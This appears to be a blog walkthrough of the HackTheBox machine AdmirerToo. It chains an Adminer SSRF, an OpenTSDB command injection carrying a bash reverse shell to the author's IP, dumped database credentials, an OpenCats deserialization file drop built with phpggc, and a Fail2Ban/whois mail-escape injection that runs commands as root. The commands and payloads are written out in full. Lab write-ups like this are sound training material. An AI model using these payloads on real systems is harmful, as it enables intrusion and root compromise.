---
title: "Walk-through of AdmirerToo from HackTheBox"
header:
  teaser: /assets/images/2022-02-26-11-58-22.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - Adminer
  - CVE-2021-21311
  - SSRF
  - OpenTSDB
  - MySQL
  - OpenCats
  - phpggc
  - Fail2Ban
---

## Machine Information

![admirertoo](/assets/images/2022-02-26-11-58-22.png)

We start this box on port 80, there's a website and some enumeration finds us a database. We use an SSRF vulnerability to find OpenTSDB running on another port. This is also vulnerable and we use an exploit to gain a shell on the box. Looking around we find OpenCats, MySQL and user credentials. Eventually we get access to SSH as user Jennifer, which lets us port forward and get to the OpenCats site remotely. There we find a way to drop a bash script by creating a serialised payload, and get root to execute it using a Fail2Ban exploit and a whois configuration file.

<!--more-->

Skills required are good enumeration and exploit research knowledge. Skills learned are creating serialised payloads, and chaining vulnerabilities to get code execution.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Hard - AdmirerToo](https://www.hackthebox.com/home/machines/profile/427) |
| Machine Release Date | 15th January 2022 |
| Date I Completed It | 1st March 2022 |
| Distribution Used | Kali 2021.4 – [Release Info](https://www.kali.org/blog/kali-linux-2021-4-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/admirertoo]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.137 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/admirertoo]
└─# nmap -p$ports -sC -sV -oA admirertoo 10.10.11.137
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 12:01 GMT
Nmap scan report for 10.10.11.137
Host is up (0.034s latency).

PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp    open     http           Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
4242/tcp  filtered vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
```

Only port 80 available for now with a few possibly interesting for later that are filtered:

![admirertoo-website](/assets/images/2022-02-26-12-50-53.png)

There is nothing on the website and Feroxbuster didn't find anything with a brute force. A none existent page gives us a 404 not found as expected:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# curl -i http://10.10.11.137/pencer   
HTTP/1.1 404 Not Found
Date: Sat, 26 Feb 2022 13:10:59 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 325
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at <a href="mailto:webmaster@admirer-gallery.htb">10.10.11.137</a> Port 80</address>
</body></html>
```

However there is a domain revealed by the mailto link. Let's put that in our hosts file::

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# echo "10.10.11.137 admirer-gallery.htb" >> /etc/hosts
```

## Gobuster

Browsing to that address gives us the same simple webpage. Let's try another brute force, this time looking for vhosts:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://admirer-gallery.htb  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://admirer-gallery.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/26 12:58:27 Starting gobuster in VHOST enumeration mode
===============================================================
Found: db.admirer-gallery.htb (Status: 200) [Size: 2511]
===============================================================
2022/02/26 13:01:14 Finished
===============================================================
```

Now we have a subdomain, add that to our hosts file:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# echo "10.10.11.137 db.admirer-gallery.htb" >> /etc/hosts
```

## Adminer

Browsing to the site we find a log in page for Adminer 4.7.8:

![admirertoo-gallery](/assets/images/2022-02-27-21-10-58.png)

Clicking enter take us inside and we can look around the database:

![admirertoo-adminer](/assets/images/2022-02-27-21-18-52.png)

There's not a lot you can do in here. Looking for an exploit I see this version of Adminer is from December 2020 and there's a few options [here](https://www.cvedetails.com/vulnerability-list/vendor_id-17755/product_id-44183/Adminer-Adminer.html). For 4.7.8 we have [CVE-2021-21311](https://www.cvedetails.com/cve/CVE-2021-21311/) with an exploit [here](https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf).

## SSRF Vulnerability

Reading through the exploit we see there is a SSRF vulnerability with a script [here](https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py) that we can use to redirect requests. Let's grab it and set it listening:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# wget https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py
--2022-02-28 22:31:43--  https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.110.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1290 (1.3K) [text/plain]
Saving to: ‘redirect.py.1’
redirect.py   100%[==============================================================================>]   1.26K  --.-KB/s    in 0s      
2022-02-28 22:31:43 (139 MB/s) - ‘redirect.py’ saved [1290/1290]

┌──(root💀kali)-[~/htb/admirertoo]
└─# python2 redirect.py --port 80 http://127.0.0.1
serving at port 80
```

With that waiting let's start Burp so we can intercept requests from the browser. Now back to the website and with Burp ready to intercept click Enter here:

![admirertoo-gallery](/assets/images/2022-02-27-21-10-58.png)

In Burp we have captured the request:

![admirertoo-capture-request](/assets/images/2022-02-28-22-38-10.png)

The last part of the POST message is URL encoded, if you decode it looks like this:

```text
auth[driver]=server&auth[server]=localhost&auth[username]=admirer_ro&auth[password]=1w4nn4b3adm1r3d2!&auth[db]=admirer&auth[permanent]=1
```

If you look at the exploit it shows you to change the System field to Elasticsearch, for our form we need to change the parameter **auth[driver]** which is the equivalent. Just to make it more complicated if you look in the docs [here](https://github.com/vrana/adminer/blob/master/adminer/drivers/elastic.inc.php) the driver is actually called elastic not elasticsearch.

Secondly the exploit shows you to change server to your attack machines IP, for our form we need to change the parameter **auth[server]** which is the equivalent.

So our altered parameters look like this:

```text
auth[driver]=elastic&auth[server]=10.10.16.95&auth[username]=admirer_ro&auth[password]=1w4nn4b3adm1r3d2!&auth[db]=admirer&auth[permanent]=1
```

URL encode that and replace in Burp so it looks like this:

![admirertoo-altered-request](/assets/images/2022-02-28-22-50-10.png)

Click forward and you'll see a GET request in Burp:

![admirertoo-get-request](/assets/images/2022-02-28-22-53-33.png)

Click forward again and you'll see the page looks like this instead of the db admin screen we saw before:

![admirertoo-ssrf-index-page](/assets/images/2022-02-28-22-54-55.png)

If you do html2text on that output you'll see it's the index.php page from the original admirer-gallery.htb site we saw right at the start:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# cat html | html2text

Admirer
****** Admirer of theworld. ******
Welcome to my image gallery.
Are you an admirer too?
 [img/highway.jpg]
******_Biodiesel_squid_******
Have_you_ever_seen_anything_like_it?
[img/portfolio_item_4.png]
******_raclette_taxidermy_******
Impressive,_isn't_it?
<SNIP>
```

And looking at our redirector running in Kali we see we had a hit:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# python2 redirect.py --port 80 http://127.0.0.1
serving at port 80
10.10.11.137 - - [28/Feb/2022 22:53:51] "GET / HTTP/1.0" 301 -
10.10.11.137 - - [28/Feb/2022 22:53:52] "GET / HTTP/1.0" 301 -
```

This confirms that we redirected the request back to port 80 on the box and that we can use SSRF to further enumerate it. If you need a primer on SSRF then PortSwigger have a good article [here](https://portswigger.net/web-security/ssrf).

## Scanning Filtered Ports

If we look back at our Nmap scan at the start there were a couple of filtered ports, this one being of interest:

```text
4242/tcp  filtered vrml-multi-use
```

With our ability to use an SSRF attack we can probe that port from inside the box, we just need to change our redirector:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# python2 redirect.py --port 80 http://127.0.0.1:4242
serving at port 80
```

Now when the box request comes to us on Kali we redirect it back on port 4242. We need to do the same process as before to perform the SSRF attack. So back to the web browser, go to the login page. With Burp ready to intercept click the Enter button:

![admirertoo-gallery](/assets/images/2022-02-27-21-10-58.png)

Change the last part so auth[driver] is set to elastic and auth[server] is set to our Kali IP:

![admirertoo-altered-request](/assets/images/2022-02-28-22-50-10.png)

Click forward and you'll see a GET request in Burp:

![admirertoo-get-request](/assets/images/2022-02-28-22-53-33.png)

Click forward again and switch back to the browser to see the reflected output:

![admirertoo-opentsdb](/assets/images/2022-03-01-22-10-37.png)

## OpenTSDB

You can see the title of the page says OpenTSDB. I've never heard of this but a quick search found the GitHub repo for it [here](https://github.com/OpenTSDB/opentsdb). And a look for exploits found [this](https://nvd.nist.gov/vuln/detail/CVE-2020-35476) CVE, with a POC [here](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml) that tries to leak the passwd file. I also found further info in the issue raised [here](https://github.com/OpenTSDB/opentsdb/issues/2051) for the project.

So I used the example and changed my redirector to look like this:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# python2 redirect.py --port 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=%5B33:system(%27cat+/etc/passwd%27)%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json'
serving at port 80
```

It's hard to read but I'm doing a cat of /etc/passwd using the exploit. So same as before, back to the browser, have Burp intercepting, click Enter capture request and change auth[driver] and auth[server] just like we did the last couple of time. Forward that and back in the browser we see this:

![admirertoo-optsdb-error](/assets/images/2022-03-01-22-38-43.png)

A long list of errors with the important bit at the end highlighted. No such metric as sys.cpu.nice. A search found [this](https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http) on StackOverflow to list the available metrics. Change our redirector:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# python2 redirect.py --port 80 'http://127.0.0.1:4242/api/suggest?type=metrics'
serving at port 80
```

Back to the browser, intercept with Burp etc. After forwarding on we see this response in the browser:

![admirertoo-metrics](/assets/images/2022-03-01-22-53-19.png)

So now we know the only available metric is http.stats.web.hits. I messed around for ages trying to get the passwd file or any other file displaying in the browser using that metric. I didn't get an error so was sure I'd got the parameter correct. In the end I went with a reverse shell which worked first time!

## Reverse Shell

I took this simple reverse shell:

```text
'/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.95/1337 0>&1"'
```

I URL encoded it so it looked like this:

```text
%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%39%35%2f%31%33%33%37%20%30%3e%26%31%22%27
```

Then I started my redirector with that in there as the system command to execute:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# python2 redirect.py --port 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%39%35%2f%34%34%34%34%20%30%3e%26%31%22%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json'
serving at port 80
```

Back to the browser, intercept with Burp etc. Forward on request in Burp then back to the terminal to see we are connected:

```sh
┌──(root💀kali)-[~]
└─# nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.10.16.95] from (UNKNOWN) [10.10.11.137] 58776
bash: cannot set terminal process group (584): Inappropriate ioctl for device
bash: no job control in this shell
opentsdb@admirertoo:/$ 
```

Upgrade shell before we do anything:

```text
opentsdb@admirertoo:/$ which python
/bin/python
opentsdb@admirertoo:/$ python -c 'import pty;pty.spawn("/bin/bash")'
opentsdb@admirertoo:/$ ^Z    
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~]
└─# stty raw -echo; fg
opentsdb@admirertoo:/$ stty rows 51 cols 236
opentsdb@admirertoo:/$ export TERM=xterm
```

## OpenCats

Looking around I found something interesting in the /opt folder:

```text
opentsdb@admirertoo:~$ ls -l /opt
drwxr-xr-x  9 root hbase 4096 Jul  8  2021 hbase
drwxr-xr-x 23 root root  4096 Jul 21  2021 opencats
```

Looking in that folder the readme points us to the docs [here](https://opencats-documentation.readthedocs.io/en/latest/introduction.html). It seems to be a free recruitment system, and looking in the folder I found a config file with data base credentials:

```text
opentsdb@admirertoo:/opt/opencats$ more config.php
<?php
/*
 * CATS
 * Configuration File
 *
<SNIP>
/* Database configuration. */
define('DATABASE_USER', 'cats');
define('DATABASE_PASS', 'adm1r3r0fc4ts');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'cats_dev');
```

## MySQL Enumeration

We can find the database:

```text
opentsdb@admirertoo:/opt/opencats$ find / -name cats_dev 2>/dev/null
/var/lib/mysql/cats_dev
```

With the credentials we can enumerate the database and dump users:

```text
opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show databases;'
+--------------------+
| Database           |
+--------------------+
| cats_dev           |
| information_schema |
+--------------------+
opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show tables from cats_dev;'
+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
| access_level                         |
<SNIP>
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show columns in user from cats_dev;'
+---------------------------+--------------+------+-----+---------+----------------+
| Field                     | Type         | Null | Key | Default | Extra          |
+---------------------------+--------------+------+-----+---------+----------------+
| user_id                   | int(11)      | NO   | PRI | NULL    | auto_increment |
| site_id                   | int(11)      | NO   | MUL | 0       |                |
| user_name                 | varchar(64)  | NO   |     |         |                |
| email                     | varchar(128) | YES  |     | NULL    |                |
| password                  | varchar(128) | NO   |     |         |                |
<SNIP>
| can_see_eeo_info          | int(1)       | YES  |     | 0       |                |
+---------------------------+--------------+------+-----+---------+----------------+
opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'select user_name,password from user;'
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | dfa2a420a4e48de6fe481c90e295fe97 |
| cats@rootadmin | cantlogin                        |
| jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+----------------+----------------------------------+
```

I couldn't crack those md5 hashes, so for now this is a dead. Time for more enumeration around the OS, where I eventually found more credentials:

```text
opentsdb@admirertoo:/var/www/adminer$ grep -rl "pass*" . 2>/dev/null
./plugins/data/servers.php
./plugins/oneclick-login.php
./plugins/plugin.php
./adminer-included-0ae90598f37b20e3e7eb122c427729ed.php

opentsdb@admirertoo:/var/www/adminer$ cat plugins/data/servers.php
<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];
```

Looking at users who can log in on the box we see just one:

```text
opentsdb@admirertoo:/var/www/adminer$ ls -l /home
drwxr-xr-x 3 jennifer users 4096 Feb 22 20:58 jennifer
```

## SSH As Jennifer

Turns out that password above has been reused by jennifer:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# ssh jennifer@admirer-gallery.htb
jennifer@admirer-gallery.htbs password:
Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
No mail.
Last login: Wed Mar  2 22:02:08 2022 from 10.10.14.160
jennifer@admirertoo:~$
```

Looking at running services shows a few ports listening locally:

```text
jennifer@admirertoo:~$ netstat -punta
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
```

Port 8080 is often used for websites, we can use curl to look:

```sh
jennifer@admirertoo:~$ curl 127.0.0.1:8080
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>opencats - Login</title>
```

## SSH Port Forwarding

It's a login page for OpenCats which we saw before. Let's set up a SSH tunnel from Kali to the box so we can look at that website:

```text
┌──(root💀kali)-[~/htb/admirertoo]
└─# ssh -L 1234:127.0.0.1:8080 jennifer@admirer-gallery.htb
jennifer@admirer-gallery.htb's password:
Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
Last login: Wed Mar  2 23:07:19 2022 from 10.10.14.169
jennifer@admirertoo:~$
```

Now on Kali we can browse to port 1234 and will be forwarded through our SSH tunnel to port 8080 on the box:

![admirertoo-opencats-login](/assets/images/2022-03-02-23-13-05.png)

## OpenCats Exploit

The login page shows us the version is 0.9.5.2, a search found two CVEs. [This](https://www.opencve.io/cve/CVE-2021-25294) is a de-serialization exploit, and [this](https://www.opencve.io/cve/CVE-2021-25295) is a XXS issue. Both point to a technical walk through [here](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html).

To be able to take advantage of these exploits we need valid credentials to get in to the OpenCATS dashboard. Earlier I found users and hashes from the MySQL database used by OpenCATS, but I couldn't crack them. Instead with admin access to the database we can just set a new password for the admin account.

Create an md5 hash of my password which is pencer:

```text
jennifer@admirertoo:~$ echo -n pencer | md5sum
b8ea4ab13b0e0864760dbfb9427f31fc  -
```

Find the user_id of the admin account in the database:

```text
jennifer@admirertoo:~$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'select user_id,user_name,password from user;'
+---------+----------------+----------------------------------+
| user_id | user_name      | password                         |
+---------+----------------+----------------------------------+
|       1 | admin          | dfa2a420a4e48de6fe481c90e295fe97 |
|    1250 | cats@rootadmin | cantlogin                        |
|    1251 | jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+---------+----------------+----------------------------------+
```

Change password to my hashed version:

```text
jennifer@admirertoo:~$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'update user set password = "b8ea4ab13b0e0864760dbfb9427f31fc" where user_id = 1;'
```

## OpenCats As Administrator

Now go back to the OpenCATS login box and use admin:pencer to get in to the dashboard:

![admirertoo-opencats-dashboard](/assets/images/2022-03-03-17-37-45.png)

The exploit explains there is an insecure deserialize function in use on the activities section. Start Burp and have it ready to intercept then click on Date:

![admirertoo-activities](/assets/images/2022-03-03-21-59-29.png)

Looking in Burp you can see there is a serialized string after the ActivityDataGrid parameter:

![admirertoo-burp-intercept](/assets/images/2022-03-03-22-03-04.png)

## phpggc

We can change that for our own code and drop a file on the box. Use [phpggc](https://github.com/ambionics/phpggc) as described:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# phpggc             
Command 'phpggc' not found, but can be installed with:
apt install phpggc
Do you want to install it? (N/y)y
apt install phpggc
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  phpggc
0 upgraded, 1 newly installed, 0 to remove and 587 not upgraded.
Need to get 40.1 kB of archives.
After this operation, 423 kB of additional disk space will be used.
Get:1 https://archive-4.kali.org/kali kali-rolling/main amd64 phpggc all 0.20210218-0kali1 [40.1 kB]
Fetched 40.1 kB in 1s (40.6 kB/s) 
Selecting previously unselected package phpggc.
(Reading database ... 305301 files and directories currently installed.)
Preparing to unpack .../phpggc_0.20210218-0kali1_all.deb ...
Unpacking phpggc (0.20210218-0kali1) ...
Setting up phpggc (0.20210218-0kali1) ...
Processing triggers for kali-menu (2021.4.2) ...
```

Install if needed. Now create our test file and use phpggc to give us a serialized object:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# echo "this is a test" > pencer.txt

┌──(root💀kali)-[~/htb/admirertoo]
└─# phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/pencer.txt /root/htb/admirertoo/pencer.txt 
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%
00GuzzleHttp%5CCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Fpencer.txt%2<SNIP>%3B%7D
```

## File Drop

Now paste that in to Burp and replace what is already there:

![admirertoo-repeater](/assets/images/2022-03-03-22-10-44.png)

Using Repeater to send the request we see a 200 OK response. Switch to our SSH session on the box and check the file we just dropped on there:

```text
jennifer@admirertoo:~$ ls -l /dev/shm/
4 -rw-r--r--  1 devel devel   58 Mar  3 21:46 pencer.txt

jennifer@admirertoo:~$ cat /dev/shm/pencer.txt 
[{"Expires":1,"Discard":false,"Value":"this is a test\n"}]
```

The file is owned by another user called devel. We can look for locations that user has access to:

```text
jennifer@admirertoo:~$ find / -group devel 2>/dev/null
/dev/shm/test.txt
/opt/opencats/INSTALL_BLOCK
/usr/local/src
/usr/local/etc
```

## Fail2Ban

Now we need to find a way of exploiting the ability to drop a file of our choosing in one of those locations as the devel user. This next part took me far too long to figure out!

After looking around I notice fail2ban is installed:

```text
jennifer@admirertoo:~$ ls -l /etc/fail2ban/
drwxr-xr-x 2 root root  4096 Jul 19  2021 action.d
-rw-r--r-- 1 root root  2334 Jan 18  2018 fail2ban.conf
drwxr-xr-x 2 root root  4096 Sep 23  2018 fail2ban.d
drwxr-xr-x 3 root root  4096 Jul 19  2021 filter.d
-rw-r--r-- 1 root root 22897 Jan 18  2018 jail.conf
drwxr-xr-x 2 root root  4096 Jul 19  2021 jail.d
-rw-r--r-- 1 root root   167 Jul 19  2021 jail.local
-rw-r--r-- 1 root root   645 Jan 18  2018 paths-arch.conf
-rw-r--r-- 1 root root  2827 Jan 18  2018 paths-common.conf
-rw-r--r-- 1 root root   573 Jan 18  2018 paths-debian.conf
-rw-r--r-- 1 root root   738 Jan 18  2018 paths-opensuse.conf
```

Checking we can see it is running:

```text
jennifer@admirertoo:~$ systemctl status fail2ban.service 
● fail2ban.service - Fail2Ban Service
   Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled; vendor preset: enabled)
   Active: active (running) since Thu 2022-03-03 21:29:26 GMT; 1h 9min ago
     Docs: man:fail2ban(1)
  Process: 445 ExecStartPre=/bin/mkdir -p /var/run/fail2ban (code=exited, status=0/SUCCESS)
 Main PID: 459
    Tasks: 3 (limit: 4701)
   Memory: 22.6M
   CGroup: /system.slice/fail2ban.service
           └─459 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

Looking at config we see it's protecting ssh and set up to send emails on alerts:

```text
jennifer@admirertoo:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf
[sshd]
enabled = true

jennifer@admirertoo:~$ cat /etc/fail2ban/jail.local
[DEFAULT]
ignoreip = 127.0.0.1
bantime = 60s
destemail = root@admirertoo.htb
sender = fail2ban@admirertoo.htb
sendername = Fail2ban
mta = mail
action = %(action_mwl)s
```

Checking version installed we see it's old:

```text
jennifer@admirertoo:~$ fail2ban-server --version
Fail2Ban v0.10.2
```

[Version 0.10.2](https://github.com/fail2ban/fail2ban/releases#:~:text=a454884-,0.10.,burns%2Dlike%2Dthe%2Dcold) was released in 2018. A search finds [CVE-2021-32749](https://nvd.nist.gov/vuln/detail/CVE-2021-32749) for it. A bit of reading finds [this](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2021-32749) which leads to [this](https://research.securitum.com/fail2ban-remote-code-execution/) research and this [advisory](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm).

The key info from all that reading is this bit:

```text
The ‘~|’ escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message.
```

With this we can execute code of our choosing on the box in the context of the Fail2Ban service which runs as root. And we know from the config files to trigger it we just have to fail to log on to SSH a few times. The tricky part is how do we inject our escape sequence in to the mail that is generated, and the answer comes from the advisory [here](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm):

```text
This strictly puts whois command output of banned IP address into email. So if attacker could get control over whois output of his own IP address - code execution could be achieved (with root, which is more fun of course).
```

## Whois Config Exploit

Which leads us back to the fact that we can drop a file as user devel in /usr/local/etc via the OpenCATS un-serialize exploit. Whois uses a config file to list public whois servers. The docs for [this](https://notabug.org/mthl/jwhois) version of whois says:

```text
The configuration file should reside in the /usr/local/etc directory, or the directory that you specified using the --sysconfdir switch to the configure script.
```

So we create a whois.conf file that points the box to our Kali IP which it will use when it looks up the IP that Fail2Ban will block. For this to work we have to use a Regex expression in our conf file because of the way phpggc encodes the input.

For example if we do this:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# echo "[10.10.14.169]" > whois.conf
```

Then after encoding and dropping on the box it will look like this:

```text
jennifer@admirertoo:~$ cat/usr/local/etc/whois.conf
[{"Expires":1,"Discard":false,"Value":"[10.10.14.169]\n"}]
```

Which isn't a valid and you get an error when trying to use whois on the box. Instead we use regex like this:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# echo "}]|. [10.10.14.169]" > whois.conf
```

Then it will look like this when it's dropped on the box:

```text
jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf
[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.169]\n"}]j
```

The vertical bar is an OR in Regex, and the dot is match characters inside the square brackets. What this means is although the conf file contains invalid data when whois parses it the |. causes it to only use the characters inside the brackets. And that is a valid IP address of our waiting Kali IP.

Let's do it. First create our whois.conf file:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# echo "}]|. [10.10.14.169]" > whois.conf
```

Use phpgcc to serialise it and cause it to drop in the /usr/local/etc folder on the box:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /root/htb/admirertoo/whois.conf
a%3A2%3A%7Bi%3A7<SNIP>Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A20%3A%22%7D%5D%7C.+%5B10.10.14.169%5D
%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3
A7%3Bi%3A7%3B%7D
```

Back to Burp, capture the activities data grid request like before, replace the serialized content at the start with ours:

![admirertoo-whois-file-drop](/assets/images/2022-03-04-17-44-01.png)

Send to the box, then switch to our SSH session connected as Jennifer. Make sure the file is there:

```text
jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.169]\n"}]
```

Create a payload on Kali that we want to inject in to the email and have executed on the box. I could have gone for a reverse shell but to keep it simple I'm just copying the root flag out:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# cat flag_copy.txt
~| bash -c "cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt" &
```

Note my code I want to execute starts with the ~| which was identified in the Fail2Ban exploit as the way to inject. Now start nc listening locally on port 43, which is what whois will talk to us on:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# nc -nvlkp 43 -c "cat /root/htb/admirertoo/flag_copy.txt"
listening on [any] 43 ...
```

## Root Flag

Now fail to log in to SSH three times to cause Fail2Ban to send the email, which will use whois to look up our IP, which will get redirected to our waiting nc listener because of the whois.conf file we dropped, which in turn will send the text file back that has our cp in it:

```sh
┌──(root💀kali)-[~/htb/admirertoo]
└─# ssh -L 1234:127.0.0.1:8080 jennifer@admirer-gallery.htb
jennifer@admirer-gallery.htbs password: 
Permission denied, please try again.
jennifer@admirer-gallery.htbs password: 
Permission denied, please try again.
jennifer@admirer-gallery.htbs password: 
jennifer@admirer-gallery.htb: Permission denied (publickey,password).
```

Now finally back on the box as Jennifer we have access to the root flag in the /tmp folder:

```text
jennifer@admirertoo:~$ cat /tmp/root.txt 
e3eeb41b4e22ad1ca6419cf2501b2ab2
```

All done. See you next time.
